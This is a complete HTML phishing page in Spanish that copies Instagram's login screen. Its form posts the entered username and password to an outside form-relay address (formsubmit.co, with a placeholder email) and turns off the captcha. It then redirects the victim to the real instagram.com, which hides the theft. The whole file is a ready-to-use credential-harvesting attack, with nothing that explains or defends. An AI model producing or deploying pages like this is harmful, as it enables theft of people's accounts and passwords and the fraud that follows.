
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Instagram - Iniciar sesión</title>
  <style>
    body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { background: white; padding: 2rem; border: 1px solid #dbdbdb; border-radius: 10px; text-align: center; width: 300px; }
    h2 { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin-bottom: 1rem; }
    input { width: 100%; padding: 0.5rem; margin: 0.5rem 0; border: 1px solid #dbdbdb; border-radius: 3px; }
    button { width: 100%; padding: 0.5rem; background: #0095f6; color: white; border: none; border-radius: 3px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Instagram</h2>
    <form action="https://formsubmit.co/tu_correo@ejemplo.com" method="POST">
      <input type="text" name="Usuario" placeholder="Teléfono, usuario o correo electrónico" required>
      <input type="password" name="Contraseña" placeholder="Contraseña" required>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://instagram.com">
      <button type="submit">Iniciar sesión</button>
    </form>
  </div>
</body>
</html>
